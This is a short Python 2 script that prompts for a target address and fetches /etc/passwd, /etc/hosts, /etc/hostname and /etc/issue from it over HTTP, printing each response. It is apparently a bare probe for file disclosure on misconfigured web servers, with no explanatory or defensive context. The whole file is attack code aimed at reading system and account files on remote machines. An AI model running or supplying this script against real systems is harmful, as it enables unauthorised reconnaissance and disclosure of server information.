import urllib2

host = raw_input(" ip : ")
path = list(("/etc/passwd", "/etc/hosts"))
path.append("/etc/hostname")
path.append("/etc/issue")

for x in path:
    print ("-" * 200)
    print (x)
    print ("-" * 200)
    print urllib2.urlopen(host + x).read()
  
  
